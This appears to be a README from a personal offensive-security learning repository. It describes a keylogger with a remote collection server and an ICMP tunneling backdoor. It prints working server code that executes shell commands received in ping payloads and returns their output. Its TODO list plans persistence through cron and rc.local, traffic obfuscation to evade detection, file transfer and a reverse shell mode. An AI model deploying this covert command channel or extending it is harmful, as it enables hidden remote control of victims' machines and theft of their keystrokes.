# Details

## 1. keyloggers/klogger.s

TODO

## 2. keyloggers/klogger.py && keyloggers/server.py

A simple keylogger and its remote server for receiving keystroke data. Just a learning project — messing around with Linux input devices, sockets, and low-level stuff. 01/08/25 - added secure communication.

```
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr
openssl x509 -req -in server.csr -signkey server.key -out server.crt -days 365
```

### TODO

- Make device detection smarter (support more than one keyboard or detect devices dynamically)
- Handle special keys better (Shift, Ctrl, etc.) — smarter key parsing
- Show or save logs on the server side
- Try supporting multiple clients at the same time

### Notes

- i would like to build keylogger in c as well

## 3. tunneling/icmp/server.py && tunneling/icmp/client.py

A simple ICMP tunneling server with a matching client. I only explained the server side since the client is very similar and didn’t need separate explanation.

3.1. icmp checksum function:

Calculates the ICMP checksum. This is used to verify packet integrity by detecting corruption during transmission.

```
def checksum(data):
    if len(data) % 2:
        data += b'\x00' 

    s = sum(data[i] + (data[i+1] << 8) for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff
```

3.2. create_reply_packet function:

Before calculating the checksum, the checksum field in the ICMP header must be set to zero. This ensures the checksum is calculated correctly over the entire ICMP message (header + payload).

In ICMP Echo Reply packets, the Identifier and Sequence Number fields must be kept the same as in the corresponding Echo Request. These fields are used to match replies to their original requests, allowing the client to confirm that the response is valid and not from a different or unrelated packet.

After setting the checksum field to zero and ensuring the Identifier and Sequence Number match, we calculate the checksum and insert it into the header. The resulting ICMP packet is then ready to be sent back to the client.

ICMP Header: `Type (1B)` | `Code (1B)` | `Checksum (2B)` | `Identifier (2B)` | `Sequence Number (2B)`

Struct Module details: ! = network byte order (big-endian), B - Byte, H - Short

| Field        | Request (Echo)                   | Reply (Echo Reply) |
| ------------ | -------------------------------- | ------------------ |
| Type         | 8 (Echo Request)                 | 0 (Echo Reply)     |
| Identifier   | **Same**                         | **Same**           |
| Sequence     | **Same**                         | **Same**           |
| Payload/Data | Often the same, but not required | Often the same     |


```
def create_reply_packet(identifier, sequence, payload):
    header = struct.pack('!BBHHH', 0, 0, 0, identifier, sequence)
    data = payload.encode()
    chksum = checksum(header + data)
    header = struct.pack('!BBHHH', 0, 0, chksum, identifier, sequence)
    return header + data
```

3.3. verify_req_checksum function:

Each ICMP request includes a checksum that must be verified to ensure the integrity of the packet and detect any corruption during transmission.

```
def verify_req_checksum(code, chksum, ident, seq, payload):
    header = struct.pack('!BBHHH', 8, code, 0, ident, seq)
    data = payload.encode()
    chksum_rslt = checksum(header + data)
    if chksum_rslt == chksum:
        return True
    return False
```

3.4. main function:

Since we're using SOCK_RAW, the system does not automatically verify the ICMP checksum for us. That’s why we implement our own verify_req_checksum function to manually check the integrity of incoming packets.

We know the ICMP header starts at byte 20 because the IP header is always 20 bytes (assuming no IP options). The ICMP header itself is 8 bytes long, consisting of the Type, Code, Checksum, Identifier, and Sequence Number fields. So the actual data (payload/command) begins at byte 28:

`[ IP Header (20 bytes) ] + [ ICMP Header (8 bytes) ] + [ Data (variable length) ]`

After verifying the packet is intact, we extract the command from the payload, execute it, wrap the result into a new ICMP reply packet, and send it back to the client.

```
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    print("Waiting for ICMP packet...")
    while True:
        packet, addr = s.recvfrom(1024)
        print(packet)
        icmp_header = packet[20:28]
        print(icmp_header)
        type, code, chksum, ident, seq = struct.unpack('!BBHHH', icmp_header)

        print(f"request checksum: {chksum}")
        if type == 8:
            print(f"[+] Ping from {addr[0]}")
            command = packet[28:].decode(errors='ignore')
            if verify_req_checksum(code, chksum, ident, seq, command):
                output = subprocess.getoutput(command)
                reply = create_reply_packet(ident, seq, output)
                s.sendto(reply,(addr[0], 0))
            else:
                print("ICMP packet is corrupted")
```

### TODO

- add ncryption
- chunking large responses
- add a loop on the client that sends new commands without restarting
- reverse shell mode
- add the client to cron jobs, system startup scripts, or rc.local to maintain access
- Implement a mini command-and-control protocol:

    Command types: exec, download, upload, exit, info
    JSON-based or byte-coded protocol in the payload

- Obfuscation & Stealth

    Obfuscate traffic: random delays, mimic legit ICMP
    Use non-standard ICMP types (e.g. timestamp or unused codes)
    Base64 or XOR payloads to avoid static signatures

- Multi-Client Support
- add support for uploading/downloading files over ICMP packets
-  cross-platform compatibility

- [bitwise not](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_NOT)
- [ICMP](https://www.rfc-editor.org/rfc/rfc792)
- [struct module](https://docs.python.org/3/library/struct.html)
- [ICMP wiki](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol)
- [socket](https://docs.python.org/3/library/socket.html)
- [ipaddress module](https://docs.python.org/3/library/ipaddress.html)
- [errors](https://docs.python.org/3/tutorial/errors.html)
- [computing the internet checksum](https://datatracker.ietf.org/doc/html/rfc1071)